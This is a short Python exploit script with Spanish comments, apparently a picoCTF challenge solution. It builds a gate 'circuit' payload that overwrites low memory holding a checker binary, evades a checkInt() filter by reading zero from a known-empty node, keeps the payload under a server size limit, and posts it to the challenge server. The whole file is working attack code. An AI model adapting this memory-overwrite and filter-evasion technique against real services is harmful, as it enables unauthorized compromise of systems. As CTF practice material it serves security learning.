import struct
import requests

try:
    with open('programs/flag.bin', 'rb') as f:
        flag_bin = f.read()
except FileNotFoundError:
    print("Error: Asegúrate de ejecutarlo donde está la carpeta 'programs'")
    exit(1)

words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

circuit = []
node_id = 2048 

# Reducimos el ataque a 120 iteraciones para no exceder los 100KB del servidor.
# Empezamos en el nodo 1 porque el nodo 0 falla el filtro de checkInt().
for i in range(1, 120):
    val = words[(i - 1) % len(words)]
    
    target_node = i # Direcciones de memoria bajas de la CPU (donde está nand_checker.bin)
    
    dummy_node = 20480 + i * 2
    temp_node  = 20480 + i * 2 + 1
    
    if val == 0:
        # Truco para usar un 0 evadiendo checkInt: 
        # Leemos del Nodo 640 (memoria 0x0500) que sabemos que siempre está vacía (0)
        circuit.append({"input1": 1, "input2": 1, "output": dummy_node})
        val_node = 640 
    else:
        circuit.append({"input1": val, "input2": val, "output": dummy_node})
        val_node = node_id
        
    node_id += 3
    
    circuit.append({"input1": val_node, "input2": val_node, "output": temp_node})
    node_id += 3
    
    circuit.append({"input1": temp_node, "input2": temp_node, "output": target_node})
    node_id += 3

print(f"[*] Payload compacto de {len(circuit)} compuertas ensamblado. Tamaño seguro para Express.")
print("[*] Disparando exploit...")

url = "http://activist-birds.picoctf.net:53090/check"
response = requests.post(url, json={"circuit": circuit})

if response.status_code == 200:
    print("[*] ¡Éxito! Respuesta del servidor:")
    print(response.json())
else:
    print(f"[!] Error HTTP {response.status_code}:")
    print(response.text)
